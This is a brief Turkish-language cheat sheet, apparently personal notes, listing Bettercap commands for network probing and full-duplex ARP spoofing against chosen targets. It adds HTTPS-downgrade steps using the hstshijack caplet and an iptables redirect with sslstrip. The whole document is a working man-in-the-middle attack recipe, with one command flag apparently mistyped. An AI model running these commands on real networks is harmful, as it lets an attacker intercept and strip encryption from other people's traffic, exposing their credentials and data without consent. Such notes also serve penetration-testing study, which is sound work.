Bettercap:
->bettercap -face <interface>
->net.probe on
->net.show
->set arp.spoof.fullduplex true
->set arp.spoof.targets <target_ip>, <target_ip>...
->arp.spoof on (Komutu ile saldırımız başladı.)

Bettercap ile HTTPS Düşürmek:
    hstshijack/hstshijack (Kmoutu ile https site http'ye düşürmüş oluruz.Bettercap dosyasında caplets klasörünün içinde hstshijack bölümünden domainleri düzenleyebiliriz.)


HTTPS Düşürmek:
    ->iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
    ->sslstrip
    
